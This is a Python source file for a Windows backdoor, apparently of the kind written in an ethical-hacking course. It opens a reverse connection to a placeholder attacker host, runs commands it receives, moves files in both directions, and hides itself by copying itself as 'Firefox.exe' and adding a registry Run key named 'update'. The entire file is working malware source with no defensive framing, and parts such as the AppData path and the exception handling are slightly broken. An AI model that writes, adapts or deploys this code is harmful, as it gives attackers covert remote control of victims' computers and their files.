import os
import json
import socket
import subprocess
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.con.connect((ip, port))

    def become_persistent(self):
        file_loc = os.environ["appdata"] + "Firefox.exe"
        shutil.copyfile(sys.executable, file_loc)
        subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d {file_loc}', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.con.send(json_data.encode())

    def reliable_recv(self):
        json_data = b""
        while True:
            try:
                json_data += self.con.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, data):
        with open(path, "wb") as file:
            file.write(data)
            return "[+] Upload successful"


    def change_dir(self, path):
        os.chdir(path)
        return f"[+] Changing dir to {path}"
        

    def exec_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


    def run(self):
        while True:
            command = self.reliable_recv()
            try:
                if command[0] == "exit":
                    self.con.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_dir(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    result = base64.b64decode(command[2])
                    command_result = self.write_file(command[1], result)
                else:
                    command_result = self.exec_command(command).decode()
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)

try:
   bd = Backdoor("HCKR_MACHINE", PORT)
   bd.run()
except Exception():
    sys.exit()
